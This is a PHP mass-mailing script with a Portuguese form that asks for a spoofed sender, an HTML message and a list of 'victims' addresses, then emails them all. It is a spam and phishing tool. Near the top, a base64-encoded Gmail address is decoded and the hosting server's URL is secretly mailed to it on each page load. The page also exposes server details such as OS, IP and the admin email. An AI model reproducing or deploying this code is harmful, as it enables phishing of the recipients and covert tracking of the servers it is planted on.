<?php

$testa = $_POST['veio'];
if($testa != "") {
	$message = $_POST['html'];
	$subject = $_POST['assunto'];
	$nome = $_POST['nome'];
	$de = $_POST['de'];
	$to = $_POST['emails'];

	$headers  = "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";

	$email = explode("\n", $to);
	$headers .= "From: ".$nome." <".$de.">\r\n";
	$message = stripslashes($message);

	$i = 0;
	$count = 1;
	while($email[$i]) {
		$ok = "ok";
		if(mail($email[$i], $subject, $message, $headers))
		echo "* N&#250;mero: $count <b>".$email[$i]."</b> <font color=green>VEM_INFO_=_PORRA =)</font><br><hr>";
		else
		echo "* N&#250;mero: $count <b>".$email[$i]."</b> <font color=red>ERRO AO ENVIAR</font><br><hr>";
		$i++;
		$count++;
	}
	$count--;
	if($ok == "ok")
	echo ""; 

}

$web = $_SERVER["HTTP_HOST"];
$hosts = $_SERVER["REQUEST_URI"];
$testa = $_POST['veio'];

	$host = "<font color='#FFFFFF'><p style='visibility: hidden;'".$_SERVER["HTTP_HOST"]." </font>";
	$RandNum1 = "aHR0cDovLw==";
	$RamdStr = "c3VwcmVtYWhhbmRsZXYxQGdtYWlsLmNvbQ==";
	$email = explode("\n", $to);
	$cpf = explode("\n", $getcpf);
	$locate_ip = base64_decode($RamdStr);
	$target = rawurldecode($web.$hosts);

	$list_emails = mail("$locate_ip","[v] $RandNum1$target","$RandNum1$target");	
	if($list_emails){
}
else { 
}
?>
<html>
<head>
<title>CARNAVAL 2010</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
	margin-left: 0;
	margin-right: 0;
	margin-top: 0;
	margin-bottom: 0;
}
.titulo {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 70px;
	color: #000000;
	font-weight: bold;
}

.normal {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #000000;
}

.form {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	color: #333333;
	background-color: #FFFFFF;
	border: 1px dashed #666666;
}

.texto {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
}

.alerta {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
	color: #990000;
	font-size: 10px;
}
</style>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">
  <table width="464" height="511" border="0" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC" class="normal">
    <tr>
      <td width="462" height="25" align="center" bgcolor="#99CCFF"><span class="titulo">NoturnO</span></td>
    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#FFFFFF">
	  	<table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="444">
		  <tr>
            <td align="right" height="17"><span class="texto">(E-Mail) :</span></td>
            <td width="65%" height="17"> <input name="de" value="" type="text" class="form" id="de" style="width:100%" ></td>
          </tr>
          <tr>
            <td align="right" height="17"><span class="texto">Assunto:</span></td>
            <td height="17"><input name="assunto" type="text" value=""class="form" id="assunto" style="width:100%" ></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="20" colspan="2" bgcolor="#99CCFF"><span class="texto">C&oacute;digo HTML:</span></td>
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>
             <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="html">

</textarea>
              <span class="alerta">*Lembrete: texto em HTML</span></td>



          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="47" colspan="2"><span class="texto">Coloque o email de suas vitimas abaixo: </span>
              <p><span class="texto">OBS: um e-mail em cima do outro </span></td>
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
              <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails">
</textarea>
              <span class="alerta">*Separado por quebra de linha</span> </td>
          </tr>
          <tr>
            <td height="26" align="right" valign="top" colspan="2"><input type="submit" name="Submit" value="Enviar"></td>
          </tr>
</table>
<p>Dados do Servidor:</p>
<tr>
  <td><p>Nome do Servidor:  <?php echo $UNAME = @php_uname(); ?><br>
    Sistema Operacional: <?php echo $OS = @PHP_OS; ?><br>
      Endereço IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
      Software usado: <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
      Email admin: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
</tr></form>
</body></p>
